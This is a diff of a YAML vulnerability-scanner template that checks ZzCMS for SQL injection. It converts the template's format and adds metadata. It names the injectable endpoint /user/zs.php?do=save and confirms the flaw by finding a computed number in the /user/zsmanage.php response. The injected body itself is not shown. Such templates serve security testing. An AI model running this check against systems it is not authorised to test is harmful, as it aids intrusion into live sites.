@@ -1,10 +1,6 @@
-id: zzcms-zsmanage-sqli
-
-info:
-    name: ZzCMS zsmanage sqli
-    author: JingLing(https://hackfun.org/)
-    severity: high
-
+name: poc-yaml-zzcms-zsmanage-sqli
+manual: true
+transport: http
 set:
     r0: randomLowercase(6)
     r1: randomInt(40000, 44800)
@@ -12,6 +8,7 @@ set:
 rules:
     r0:
         request:
+            cache: true
             method: POST
             path: /user/zs.php?do=save
             headers:
@@ -21,8 +18,14 @@ rules:
         expression: response.status == 200
     r1:
         request:
+            cache: true
             method: GET
             path: /user/zsmanage.php
             follow_redirects: true
         expression: response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
 expression: r0() && r1()
+detail:
+    author: JingLing(https://hackfun.org/)
+    links:
+        - https://github.com/JcQSteven/blog/issues/18
+    version: zzcms201910
